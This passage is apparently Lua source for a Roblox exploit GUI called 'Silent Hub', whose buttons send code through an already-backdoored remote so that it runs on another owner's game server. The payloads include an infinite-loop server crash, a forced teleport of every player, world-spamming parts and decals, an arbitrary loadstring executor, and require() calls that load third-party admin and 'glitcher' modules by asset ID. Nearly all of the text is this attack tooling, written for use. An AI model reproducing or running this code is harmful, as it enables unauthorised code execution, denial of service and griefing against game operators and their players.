	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_88);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
local function C_8b()
local script = G2L["8b"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local code = [[
		local r, g, b = ]] .. input.Text .. [[
		game.Lighting.FogColor = Color3.fromRGB(r, g, b)
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_8b);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
local function C_8e()
local script = G2L["8e"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local code = [[
		game.Lighting.FogEnd = "]] .. input.Text .. [["
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_8e);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
local function C_91()
local script = G2L["91"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local code = [[
		game.Lighting.TimeOfDay = "]] .. input.Text .. [["
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_91);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
local function C_94()
local script = G2L["94"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local code = [[
		local id = "rbxassetid://]] .. input.Text .. [["
		
		for i, v in pairs(game.Workspace:GetDescendants()) do
			local p = Instance.new("ParticleEmitter")
			p.Texture = id
			p.Parent = v
		end
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_94);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
local function C_97()
local script = G2L["97"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local code = [[
		local id = "rbxassetid://]] .. input.Text .. [["
		
		if game.Workspace:FindFirstChild("Sound") then
			game.Workspace.Sound:Destroy()
		end
		
		local sound = Instance.new("Sound")
		sound.SoundId = id
		sound.Parent = game.Workspace
		sound.Volume = 1
		sound.Looped = true
		sound:Play()
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_97);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
local function C_9a()
local script = G2L["9a"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local code = [[
		function crash()
		while true do
		print("silent hub on top")
		end
		end
		while true do
		crash()
		crash()
	crash()
	crash()
	crash()
	crash()
	crash()
	crash()
		end
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_9a);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
local function C_9d()
local script = G2L["9d"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local code = [[
		function duck()
		local duck = Instance.new("Part", game.Workspace)
		duck.Size = Vector3.new(3,3,3)
		local asd = Instance.new("FileMesh", duck)
		asd.MeshId = "rbxassetid://521754610"
		asd.TextureId = "rbxassetid://521754612"
		asd.Scale = Vector3.new(3,3,3)
		duck.CanCollide = true
		duck.CFrame = CFrame.new(math.random(-1000,1000), math.random(300,700), math.random(-1000,1000))
		local quack = Instance.new("Sound", duck)
		quack.SoundId = "rbxassetid://2101511513"
		quack.Volume = 5
		quack.PlaybackSpeed = 1
		quack:Play()
		game.Debris:AddItem(quack, 0.5)
		end
		
		while wait() do
		duck()
		duck()
		duck()
		duck()
		duck()
		duck()
		end
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_9d);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
local function C_a0()
local script = G2L["a0"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local code = [[
		local ts = game.TeleportService
		
		for i, v in pairs(game.Players:GetPlayers()) do
			ts:Teleport(]] .. input.Text .. [[, v)
		end
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_a0);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
local function C_a3()
local script = G2L["a3"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local code = [[
		
		local InsertService = game:GetService("InsertService")
		local id = tonumber(]] .. input.Text .. [[)
	
		if id then
			local success, asset = pcall(function()
				return InsertService:LoadAsset(id)
			end)
	
			if success and asset then
				for _, obj in ipairs(asset:GetChildren()) do
					obj.Parent = workspace
				end
			end
		end
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_a3);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
local function C_a6()
local script = G2L["a6"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local code = [[
		local id = "rbxassetid://]] .. input.Text .. [["
		
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("BasePart") then
			local one = Instance.new("Decal")
			local two = Instance.new("Decal")
			local three = Instance.new("Decal")
			local four = Instance.new("Decal")
			local five = Instance.new("Decal")
			local six = Instance.new("Decal")
			one.Parent = v
			two.Parent = v
			three.Parent = v
			four.Parent = v
			five.Parent = v
			six.Parent = v
			one.Texture = id
			two.Texture = id
			three.Texture = id
			four.Texture = id
			five.Texture = id
			six.Texture = id
			one.Face = "Front"
			two.Face = "Back"
			three.Face = "Left"
			four.Face = "Right"
			five.Face = "Top"
			six.Face = "Bottom"
			end
		end
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_a6);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
local function C_a9()
local script = G2L["a9"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local code = [[
		local MeshTypes = {
		Enum.MeshType.Head,
		Enum.MeshType.Brick,
		Enum.MeshType.Torso,
		Enum.MeshType.Cylinder,
		Enum.MeshType.Sphere,
		Enum.MeshType.Wedge
	}
	
	while wait() do
		for _, v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") then
				local mesh = v:FindFirstChildOfClass("SpecialMesh")
	
				if not mesh then
					mesh = Instance.new("SpecialMesh")
					mesh.Parent = v
				end
	
				mesh.MeshType = MeshTypes[math.random(1, #MeshTypes)]
			end
		end
	end
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_a9);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Executor.Main.Dependent.Button.LocalScript
local function C_b0()
local script = G2L["b0"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local input = button.Parent.Parent.Parent.Main.InputArea.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local code = [[
		loadstring("]] .. text .. [[")()
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_b0);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Executor.Main.Dependent.Button.LocalScript
local function C_b3()
local script = G2L["b3"];
	local button = script.Parent
	local input = button.Parent.Parent.Parent.Main.InputArea.Input
	
	local function click()
		input.Text = ""
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_b3);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Executor.Main.InputArea.Input.LocalScript
local function C_b7()
local script = G2L["b7"];
	local TextService = game:GetService("TextService")
	
	local textbox = script.Parent
	local lineLabel = textbox.Parent:WaitForChild("LineAmount")
	
	local function updateLines()
		local text = textbox.Text
		if text == "" then text = " " end 
		
		local size = TextService:GetTextSize(
			text,
			textbox.TextSize,
			textbox.Font,
			Vector2.new(textbox.AbsoluteSize.X, math.huge)
		)
	
		local lineHeight = textbox.TextSize
		local lines = math.max(1, math.ceil(size.Y / lineHeight))
	
		local output = ""
		for i = 1, lines do
			output ..= i .. "\n"
		end
	
		lineLabel.Text = output
	end
	
	textbox:GetPropertyChangedSignal("Text"):Connect(updateLines)
	textbox:GetPropertyChangedSignal("AbsoluteSize"):Connect(updateLines)
	
	updateLines()
end;
task.spawn(C_b7);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.LocalScript
local function C_bc()
local script = G2L["bc"];
	local button = script.Parent
	local window = button.Parent.Parent.Parent.Parent.Parent
	
	local r = button.Red
	local g = button.Green
	local b = button.Blue
	
	local function click()
		window.BackgroundColor3 = Color3.fromRGB(r.Text, g.Text, b.Text)
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_bc);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.LocalScript
local function C_c5()
local script = G2L["c5"];
	local button = script.Parent
	local window = button.Parent.Parent.Parent.Parent.Parent
	
	local trans = button.TParency
	
	local function click()
		window.Transparency = trans.Text
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_c5);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.LocalScript
local function C_ca()
local script = G2L["ca"];
	local button = script.Parent
	local window = button.Parent.Parent.Parent.Parent.Parent
	
	local si = button.ScaleInput
	
	local function click()
		window.UIScale.Scale = si.Text
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_ca);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.LocalScript
local function C_cf()
local script = G2L["cf"];
	local button = script.Parent
	local window = button.Parent.Parent.Parent.Parent.Parent
	
	local function click()
		window.BackgroundColor3 = Color3.fromRGB(0,0,0)
		window.Transparency = 0.5
		window.UIScale.Scale = 1
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_cf);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Settings.Main.Button.LocalScript
local function C_d2()
local script = G2L["d2"];
	local button = script.Parent
	local gui = button.Parent.Parent.Parent.Parent.Parent.Parent
	
	local function click()
		gui:Destroy()
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_d2);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Input.LocalScript
local function C_d7()
local script = G2L["d7"];
	local input = script.Parent
	local scriptcontainer = input.Parent:WaitForChild("Dependent")
	
	local function update()
		local text = string.lower(input.Text)
	
		for _, button in ipairs(scriptcontainer:GetChildren()) do
			if button:IsA("TextButton") or button:IsA("TextLabel") then
				local buttontext = string.lower(button.Text)
	
				if string.find(buttontext, text, 1, true) then
					button.Visible = true
				else
					button.Visible = false
				end
			end
		end
	end
	
	input:GetPropertyChangedSignal("Text"):Connect(update)
end;
task.spawn(C_d7);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Spectrum Glitcher.LocalScript
local function C_dc()
local script = G2L["dc"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(4721735759).load("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_dc);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Server Admin.LocalScript
local function C_df()
local script = G2L["df"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(4665394711).load("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_df);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Black Angel.LocalScript
local function C_e2()
local script = G2L["e2"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(73220886859)("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_e2);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Grab Knife.LocalScript
local function C_e5()
local script = G2L["e5"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(93444499562289).DE("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_e5);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Lua Hammer.LocalScript
local function C_e8()
local script = G2L["e8"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(93167806571038).LuaHammerV2("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_e8);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Xester.LocalScript
local function C_eb()
local script = G2L["eb"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(6099241563).load("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_eb);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Dual Ultima.LocalScript
local function C_ee()
local script = G2L["ee"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(2946060158):Fire("]] .. game.Players.LocalPlayer.Name .. [[", "hack")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_ee);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.John Doe.LocalScript
local function C_f1()
local script = G2L["f1"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(2845929020).ooga("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_f1);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Infinite Yield.LocalScript
local function C_f4()
local script = G2L["f4"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(7634392335)("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_f4);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Star Glitcher.LocalScript
local function C_f7()
local script = G2L["f7"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(74444736936643)("]] .. game.Players.LocalPlayer.Name .. [[", "Star Glitcher")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_f7);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Deyonance Glitcher.LocalScript
local function C_fa()
local script = G2L["fa"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(17347130296).load("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_fa);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Cisynia Glitcher.LocalScript
local function C_fd()
local script = G2L["fd"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(7667220373).load("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_fd);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Neptunian Sword.LocalScript
local function C_100()
local script = G2L["100"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(82295806676393).Neptunian("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_100);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Rainbow Stand.LocalScript
local function C_103()
local script = G2L["103"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(5098731275).eliza("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_103);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Mr. Bean Admin.LocalScript
local function C_106()
local script = G2L["106"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(71449636611107)("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_106);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Last Star.LocalScript
local function C_109()
local script = G2L["109"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(17346979612).load("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
